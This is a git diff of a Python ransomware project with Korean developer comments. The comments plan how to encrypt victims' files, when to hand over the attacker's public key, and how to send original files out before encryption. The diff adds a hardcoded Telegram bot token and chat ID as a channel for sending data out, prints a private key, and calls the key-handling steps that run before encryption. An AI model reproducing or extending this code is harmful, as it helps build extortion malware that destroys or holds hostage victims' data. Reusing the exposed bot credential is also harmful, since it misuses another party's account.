@@ -8,6 +8,14 @@ from datetime import datetime#https://pynacl.readthedocs.io/en/latest/public/
 from nacl.public import PrivateKey, Box
 import telegram, asyncio
 
+#중요 시스템파일을 암호화하면 복호화를 못한다.
+#어느 시점에 해커의 공개키를 넘길 것인가
+#키를 어떤 방식으로 받을것인가? 클라이언트의 공개키?
+#원본 파일을 전송해야하는 이유_한번 알아보쟈
+#랜섬웨어 암호화 이전에 원본 파일을 보내라..중요파일?? 이유는 잘 모르겠지만 한번 쨔보쟈. 알고리즘보단 어떻게 보낼지
+#속도 느리다! .exe로 바꾸는 거 사용하면 속도가 빨라진당다앋앋앋앙당
+    #미션: 큰 파일 두고 .py랑 .exe속도 분석 및 비교(라이브러리 다 들어가나요!?)
+
     #1. 암호화와 복호화를 수행할 클래스. 파일명을 리스트로 받고, 암호화 복호화 모듈로 nacl.secretbox.SecretBox()인터페이스를 받는다.
 class EnDecryptor:
     def __init__(self, files=0, encryptModule=0):
@@ -86,8 +94,8 @@ client=Client(clientPrivateKey, serverPrivateKey.public_key)
     #7. 기본 환경설정
 MaxThread=120
 IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
-BOT=telegram.Bot(token='')#보안
-CHAT_ID=0#보안
+BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')#보안
+CHAT_ID=6478368513#보안
 
 async def sendTelegram(chat_id, msg):
     await BOT.send_message(chat_id, msg)
@@ -177,10 +185,12 @@ def getKey():
 
     #실제 암호화를 실행한다.
 if __name__ == '__main__':
-    #print("전송시도")
-    #asyncio.run(sendTelegram(CHAT_ID, "테스트전송메시지"))
-    #print("전송")
-    #sleep(100)
+    print("serverPrivateKey", serverPrivateKey)
+    print("전송시도")
+    #asyncio.run(sendTelegram(CHAT_ID, "용진님 들려요?"))
+    print("전송")
+    sleep(100)
+    
     print("[DEBUG] admin여부", IsAdmin)
     saveKey()#RSA사용하여 키를 암호화하여 저장
     getKey()#RSA사용하여 키를 복호화하여 로드
